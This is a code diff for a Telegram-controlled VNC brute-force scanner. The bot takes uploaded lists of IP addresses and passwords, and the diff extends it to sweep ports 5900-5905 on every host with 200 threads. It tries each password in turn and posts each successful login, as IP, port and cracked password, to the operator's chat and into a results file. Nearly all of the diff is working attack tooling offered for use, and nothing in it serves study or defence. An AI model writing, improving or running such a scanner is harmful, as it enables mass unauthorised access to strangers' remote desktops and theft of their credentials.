@@ -18,14 +18,15 @@ sudo_users = set()
 user_states = {}
 active_scans = {}
 
+VNC_PORTS = [5900, 5901, 5902, 5903, 5904, 5905]
+
 class VNCScanner:
-    def __init__(self, chat_id, bot, scan_threads=200, scan_timeout=2, brute_timeout=2, port=5900):
+    def __init__(self, chat_id, bot, scan_threads=200, scan_timeout=2, brute_timeout=2):
         self.chat_id = chat_id
         self.bot = bot
         self.scan_threads = scan_threads
         self.scan_timeout = scan_timeout
         self.brute_timeout = brute_timeout
-        self.port = port
         self.queue = Queue()
         self.results = []
         self.lock = threading.Lock()
@@ -36,7 +37,7 @@ class VNCScanner:
         self.start_time = None
         self.message_id = None
         self.current_password = ""
-        self.current_password_index = 0
+        self.loop = None
         
     def load_ips(self, content):
         ips = []
@@ -47,7 +48,8 @@ class VNCScanner:
                     ip, port = line.split(':')
                     ips.append((ip.strip(), int(port)))
                 else:
-                    ips.append((line.strip(), self.port))
+                    for port in VNC_PORTS:
+                        ips.append((line.strip(), port))
         return ips
         
     def load_passwords(self, content):
@@ -143,21 +145,22 @@ class VNCScanner:
                 with self.lock:
                     self.results.append(result)
                     self.checked_servers += 1
-                asyncio.run(self.send_hit(result))
+                if self.loop:
+                    asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
             else:
-                for idx, pwd in enumerate(self.passwords[1:], 1):
+                for pwd in self.passwords[1:]:
                     if not self.running:
                         break
                     with self.lock:
                         self.current_password = pwd
-                        self.current_password_index = idx
                     success, password, server_name = self.check_vnc_auth(ip, port, pwd)
                     if success:
                         result = f"{ip}:{port}-{password}-[{server_name}]"
                         with self.lock:
                             self.results.append(result)
                             self.checked_servers += 1
-                        asyncio.run(self.send_hit(result))
+                        if self.loop:
+                            asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
                         break
                 with self.lock:
                     self.checked_servers += 1
@@ -167,8 +170,8 @@ class VNCScanner:
         text = f"<b>HIT FOUND</b>\n\n<code>{result}</code>"
         try:
             await self.bot.send_message(chat_id=self.chat_id, text=text, parse_mode=ParseMode.HTML)
-        except:
-            pass
+        except Exception as e:
+            print(f"Error sending hit: {e}")
             
     async def update_progress(self):
         while self.running and self.checked_servers < self.total_servers:
@@ -178,7 +181,6 @@ class VNCScanner:
                 total = self.total_servers
                 hits = len(self.results)
                 current_pwd = self.current_password
-                pwd_idx = self.current_password_index
             elapsed = time.time() - self.start_time
             percent = (current / total) * 100 if total > 0 else 0
             speed = current / elapsed if elapsed > 0 else 0
@@ -191,12 +193,12 @@ class VNCScanner:
             
             text = (
                 f"<b>VNC SCANNER STATUS</b>\n\n"
-                f"<b>Progress:</b> {current}/{total} ({percent:.1f}%)\n"
-                f"<b>Hits Found:</b> {hits}\n"
-                f"<b>Speed:</b> {speed:.1f} servers/sec\n"
-                f"<b>Elapsed:</b> {int(elapsed)}s\n"
-                f"<b>Remaining:</b> {int(remaining)}s\n"
-                f"<b>Threads:</b> {self.scan_threads}\n"
+                f"<b>Progress:</b> {current}/{total} ({percent:.1f}%)\n\n"
+                f"<b>Hits Found:</b> {hits}\n\n"
+                f"<b>Speed:</b> {speed:.1f} servers/sec\n\n"
+                f"<b>Elapsed:</b> {int(elapsed)}s\n\n"
+                f"<b>Remaining:</b> {int(remaining)}s\n\n"
+                f"<b>Threads:</b> {self.scan_threads}\n\n"
                 f"<b>Timeout:</b> {self.scan_timeout}s\n\n"
                 f"{trying_text}"
             )
@@ -211,10 +213,12 @@ class VNCScanner:
                         parse_mode=ParseMode.HTML,
                         reply_markup=reply_markup
                     )
-            except:
-                pass
+            except Exception as e:
+                print(f"Error updating progress: {e}")
                 
     async def run(self, ips_content, passwords_content):
+        self.loop = asyncio.get_event_loop()
+        
         ips = self.load_ips(ips_content)
         self.passwords = self.load_passwords(passwords_content)
         self.total_servers = len(ips)
@@ -248,15 +252,23 @@ class VNCScanner:
         for ip_info in ips:
             self.queue.put(ip_info)
             
-        progress_task = asyncio.create_task(self.update_progress())
+        update_task = asyncio.create_task(self.update_progress())
+        
+        while not self.queue.empty() or any(t.is_alive() for t in threads):
+            await asyncio.sleep(0.5)
+            if not self.running:
+                break
+        
         self.queue.join()
         self.running = False
         
         for _ in range(self.scan_threads):
             self.queue.put(None)
         for t in threads:
-            t.join()
+            t.join(timeout=2)
             
+        await update_task
+        
         elapsed = time.time() - self.start_time
         text = (
             f"<b>SCAN COMPLETED</b>\n\n"
@@ -264,7 +276,7 @@ class VNCScanner:
             f"<b>Hits Found:</b> {len(self.results)}\n"
             f"<b>Time Elapsed:</b> {int(elapsed)}s\n"
             f"<b>Speed:</b> {self.checked_servers/elapsed:.1f} servers/sec\n\n"
-            f"Results saved to results.txt"
+            f"Results saved to file"
         )
         try:
             await self.bot.edit_message_text(
@@ -276,11 +288,10 @@ class VNCScanner:
         except:
             pass
             
-        with open(f'results_{self.chat_id}.txt', 'w') as f:
-            for result in self.results:
-                f.write(result + '\n')
-                
         if len(self.results) > 0:
+            with open(f'results_{self.chat_id}.txt', 'w') as f:
+                for result in self.results:
+                    f.write(result + '\n')
             try:
                 with open(f'results_{self.chat_id}.txt', 'rb') as f:
                     await self.bot.send_document(
@@ -346,20 +357,18 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_states[user_id]["settings"] = {
                 "threads": 200,
                 "scan_timeout": 2,
-                "brute_timeout": 2,
-                "port": 5900
+                "brute_timeout": 2
             }
         current_settings = user_states[user_id]["settings"]
         keyboard = [
             [InlineKeyboardButton(f"Threads: {current_settings['threads']}", callback_data="set_threads")],
             [InlineKeyboardButton(f"Scan Timeout: {current_settings['scan_timeout']}s", callback_data="set_scan_timeout")],
             [InlineKeyboardButton(f"Brute Timeout: {current_settings['brute_timeout']}s", callback_data="set_brute_timeout")],
-            [InlineKeyboardButton(f"Port: {current_settings['port']}", callback_data="set_port")],
             [InlineKeyboardButton("BACK", callback_data="back_main")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "<b>SETTINGS</b>\n\nClick to change values",
+            "<b>SETTINGS</b>\n\nClick to change values\n\nNote: Bot scans all VNC ports (5900-5905) automatically",
             reply_markup=reply_markup,
             parse_mode=ParseMode.HTML
         )
@@ -450,8 +459,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 state["settings"] = {
                     "threads": 200,
                     "scan_timeout": 2,
-                    "brute_timeout": 2,
-                    "port": 5900
+                    "brute_timeout": 2
                 }
             settings = state["settings"]
             
@@ -460,8 +468,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 bot=context.bot,
                 scan_threads=settings["threads"],
                 scan_timeout=settings["scan_timeout"],
-                brute_timeout=settings["brute_timeout"],
-                port=settings["port"]
+                brute_timeout=settings["brute_timeout"]
             )
             active_scans[user_id] = scanner
             
@@ -478,8 +485,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 state["settings"] = {
                     "threads": 200,
                     "scan_timeout": 2,
-                    "brute_timeout": 2,
-                    "port": 5900
+                    "brute_timeout": 2
                 }
             state["settings"][setting] = value
             user_states[user_id] = state
